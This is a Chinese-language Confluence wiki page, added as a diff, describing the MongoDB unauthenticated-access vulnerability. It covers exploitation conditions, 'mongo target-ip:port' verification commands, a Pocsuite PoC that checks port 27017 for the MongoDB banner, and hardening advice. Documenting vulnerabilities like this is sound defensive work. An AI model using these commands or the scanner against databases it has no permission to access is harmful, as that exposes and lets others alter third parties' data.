@@ -1,0 +1,134 @@
+                    
+    
+                    
+    
+                    
+    
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>查看源</title>
+        <link rel="canonical" href="/pages/viewpage.action?pageId=$action.page.id" />
+        <script>
+window.WRM=window.WRM||{};window.WRM._unparsedData=window.WRM._unparsedData||{};window.WRM._unparsedErrors=window.WRM._unparsedErrors||{};
+WRM._unparsedData["com.atlassian.plugins.atlassian-plugins-webresource-plugin:context-path.context-path"]="\u0022\u0022";
+if(window.WRM._dataArrived)window.WRM._dataArrived();</script>
+<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
+<!--[if lt IE 9]>
+<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lt+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
+<![endif]-->
+<!--[if lte IE 9]>
+<link type="text/css" rel="stylesheet" href="/s/a9f9c1d05fab5957eefbeb21808d8348-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/aa5c2abc35d1223b152f0505e791808d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lte+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
+<![endif]-->
+<link type="text/css" rel="stylesheet" href="/s/d41d8cd98f00b204e9800998ecf8427e-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/689a949132fabc86eace7102316c5470/_/download/contextbatch/css/plugin.viewsource,-_super/batch.css" data-wrm-key="plugin.viewsource,-_super" data-wrm-batch-type="context" media="all">
+<link type="text/css" rel="stylesheet" href="/s/c9e44c3fec6e22b628e530c31f2c5901-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/2d4d53e11ff32f893a00418f577e521d/_/download/contextbatch/css/page,-_super/batch.css?build-number=7701&amp;presenterForConfluenceLicensed=true" data-wrm-key="page,-_super" data-wrm-batch-type="context" media="all">
+<link type="text/css" rel="stylesheet" href="/s/c9e44c3fec6e22b628e530c31f2c5901-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/2d4d53e11ff32f893a00418f577e521d/_/download/contextbatch/css/page,-_super/batch.css?build-number=7701&amp;media=print&amp;presenterForConfluenceLicensed=true" media="print" data-wrm-key="page,-_super" data-wrm-batch-type="context">
+<link type="text/css" rel="stylesheet" href="/s/95887e175e37d26035df520d5cedc3dd-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/04aa6ccd26ebcf7271640afc46404a4e/_/download/contextbatch/css/editor-content,-_super/batch.css?confluence.table.resizable=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
+<!--[if lte IE 9]>
+<link type="text/css" rel="stylesheet" href="/s/95887e175e37d26035df520d5cedc3dd-CDN/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/04aa6ccd26ebcf7271640afc46404a4e/_/download/contextbatch/css/editor-content,-_super/batch.css?conditionalComment=lte+IE+9&amp;confluence.table.resizable=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
+<![endif]-->
+<link type="text/css" rel="stylesheet" href="/s/62670cd6c46dc9fd1c3fe85280142dff-T/zh_CN/7701/5c86c3545b3c8f6447efaa8d89a83fb420d71987/5.1.8/_/download/batch/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource.css" data-wrm-key="ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource" data-wrm-batch-type="resource" media="all">
+
+    </head>
+
+    <body class="mceContentBody aui-theme-default wiki-content fullsize">
+        <p>&nbsp;</p>         <p><br /></p><h1><span>一. 漏洞简介</span></h1><p><span><span>漏洞描述：<span style="color: rgb(85,85,85);">开启MongoDB服务时不添加任何参数时，默认是没有权限验证的，而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。</span></span></span></p><p><span style="color: rgb(26,26,26);"><span>漏洞评级：严重</span></span></p><p><span style="color: rgb(38,38,38);"><span>参考连接：<a href="http://neucert.neu.edu.cn/archives/360">http://neucert.neu.edu.cn/archives/360</a></span></span></p><p><br /></p><h1>二. 利用条件</h1><pre class="prettyprint lang-html prettyprinted"><span style="color: rgb(0,0,0);">在刚安装完毕的时候MongoDB都默认有一个admin数据库,此时admin数据库是空的,</span><span style="color: rgb(0,0,0);">没有记录权限相关的信息！当admin.system.users一个用户都没有时，即使mongod启动时添加了—auth参数,如果没有在admin数据库中添加用户,此时不进行任何认证还是可以做任何操作。</span></pre><h1>三. 漏洞验证</h1><p>linux下验证：</p><p><span style="color: rgb(0,0,0);">mongo 目标ip:端口号  #即可连上数据库</span></p><p><span style="color: rgb(0,0,0);">show dbs；</span><span class="hljs-comment" style="color: rgb(136,0,0);">#列出有哪些数据库，数据库占用了多大的存储空间。</span></p><p><span style="color: rgb(0,0,0);">db；</span><span class="hljs-comment" style="color: rgb(136,0,0);">#当前连接的是哪个数据库</span></p><h1>四. 漏洞利用</h1><p><br /></p><table class="wysiwyg-macro" data-macro-name="code" data-macro-id="df0993bb-4554-43db-826d-11503586297c" data-macro-parameters="language=py" data-macro-schema-version="1" style="background-image: url(/plugins/servlet/confluence/placeholder/macro-heading?definition=e2NvZGU6bGFuZ3VhZ2U9cHl9&amp;locale=zh_CN&amp;version=2); background-repeat: no-repeat;" data-macro-body-type="PLAIN_TEXT"><tr><td class="wysiwyg-macro-body"><pre>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+"""
+Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
+See the file 'docs/COPYING' for copying permission
+"""
+#命令行
+from pocsuite import pocsuite_cli
+#验证模块
+from pocsuite import pocsuite_verify
+#攻击模块
+from pocsuite import pocsuite_attack
+#控制台模式
+from pocsuite import pocsuite_console
+from pocsuite.api.request import req 
+from pocsuite.api.poc import register
+from pocsuite.api.poc import Output, POCBase
+
+
+class MongodbPOC(POCBase):
+    vulID = '2'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
+    version = '1' #默认为1
+    vulDate = '2017-02-22' #漏洞公开的时间,不知道就写今天
+
+    author = 'ly55521' #  PoC作者的大名
+    createDate = '2017-02-22'# 编写 PoC 的日期
+    updateDate = '2017-02-22'# PoC 更新的时间,默认和编写时间一样
+    references = ['http://0535code.com/article/20161125_1255.shtml']# 漏洞地址来源,0day不用写
+    name = 'Mongodb Unauthorized access'# PoC 名称
+    appPowerLink = 'https://www.mongodb.org/'# 漏洞厂商主页地址
+    appName = 'Mongodb'# 漏洞应用名称
+    appVersion = 'all versions'# 漏洞影响版本
+    vulType = 'weak-pass'#漏洞类型,类型参考见 漏洞类型规范表
+    desc = '''
+        Mongodb未授权漏洞,可导致mongodb数据库信息泄漏
+    ''' # 漏洞简要描述
+    samples = []# 测试样列,就是用 PoC 测试成功的网站
+    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
+    cvss = u"严重" #严重,高危,中危,低危
+
+    #验证漏洞 pocsuite -r 2-mongodb.py -u 10.1.5.26 --verify
+    def _verify(self):
+        #定义返回结果
+        result = {}
+        #获取漏洞url
+        vul_url = '%s' % self.url
+
+        #如果设置端口则取端口,没有设置则为默认端口
+        import re
+        from pocsuite.lib.utils.funs import url2ip
+        _port = re.findall(':(\d+)\s*', vul_url)
+        if len(_port) != 0:
+            _host = url2ip(vul_url)[0]
+            _port = url2ip(vul_url)[1]
+        else :
+            _host = url2ip(vul_url)
+            _port = "27017"
+
+        test_url = str( "http://" + _host + ":" + _port)
+        #print vul_url
+        try:
+            response = req.get(url=test_url,timeout=5,allow_redirects=False).content #禁止重定向
+        except Exception, e:
+            response = ""
+        """
+        It looks like you are trying to access MongoDB over HTTP on the native driver port.
+        """
+        if ("access" in response) and ("MongoDB" in response) and ("port" in response):
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['URL'] = test_url
+            result['VerifyInfo']['Payload'] = "HTTP GET"
+        else:
+            result = {}
+
+        return self.save_output(result)
+
+    #漏洞攻击
+    def _attack(self):
+        result = {}
+        # 攻击代码
+        return self._verify()
+
+    def save_output(self, result):
+        #判断有无结果并输出
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail()
+        return output
+
+register(MongodbPOC)
+
+
+
+</pre></td></tr></table><p><br /></p><h1>五. 解决方案</h1><pre class="prettyprint lang-html prettyprinted"><span style="color: rgb(26,26,26);"><br /></span></pre><p>1.<span style="color: rgb(85,85,85);">MongoDB启动时添加–auth参数</span></p><p>2.禁止使用root权限启动<span style="color: rgb(85,85,85);">MongoDB</span></p><p><span style="color: rgb(85,85,85);">3.<span style="color: rgb(85,85,85);">给MongoDB添加用户</span></span></p><p><span style="color: rgb(85,85,85);"><span style="color: rgb(85,85,85);">4.修改默认端口</span></span></p><p><span style="color: rgb(85,85,85);"><span style="color: rgb(85,85,85);">5.禁止将服务开启到公网上 </span></span></p><pre>vim /etc/<span>mongodb.conf </span></pre><pre><span>bind_ip </span>= <span style="color: rgb(128,0,128);">127.0</span>.<span style="color: rgb(128,0,128);">0.1</span></pre><p><span style="color: rgb(85,85,85);" /></p><p><span style="color: rgb(85,85,85);"><span style="color: rgb(85,85,85);"><br /></span></span></p><p><span style="color: rgb(85,85,85);"><br /></span></p><pre class="prettyprint lang-html prettyprinted"><br /></pre>
+        <p>&nbsp;</p>
+    </body>
+</html>
